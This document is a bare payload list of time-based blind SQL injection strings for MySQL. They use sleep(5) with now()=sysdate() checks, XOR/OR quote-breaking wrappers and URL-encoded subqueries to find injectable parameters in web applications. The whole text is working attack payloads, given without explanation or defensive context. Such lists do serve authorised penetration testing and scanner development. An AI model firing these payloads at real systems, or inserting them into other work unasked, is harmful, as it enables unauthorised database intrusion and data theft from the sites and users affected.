# Blind-Sql-Injection-Payload-list

# Mysql Blind

0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
if(now()=sysdate(),sleep(5),0)
'XOR(if(now()=sysdate(),sleep(5),0))XOR'
'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/
if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/
%2c(select%20*%20from%20(select(sleep(5)))a)
(select(0)from(select(sleep(5)))v)
'%2b(select*from(select(sleep(5)))a)%2b'
(select*from(select(sleep(5)))a)
1'%2b(select*from(select(sleep(5)))a)%2b'
,(select * from (select(sleep(5)))a)
desc%2c(select*from(select(sleep(5)))a)
-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*%2f
